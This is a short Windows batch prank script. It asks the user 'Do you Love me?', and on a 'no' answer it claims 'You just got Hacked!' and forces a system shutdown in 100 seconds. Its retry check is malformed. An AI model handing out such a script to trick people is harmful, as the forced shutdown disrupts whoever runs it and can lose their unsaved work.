@echo off
:1
color a
echo Hello, Do you Love me? ( answer in only Yes/no )
set /p input=
if /i %input%==Yes goto love 
if /i %input%==no goto hate
if /i not %input%== Yes,no goto 1

:love
echo I Love you too..
echo See You Later
pause
timeout 10
exit

:hate
echo But I Love You ...... lol
echo You just got Hacked!
timeout 10
shutdown -s -t 100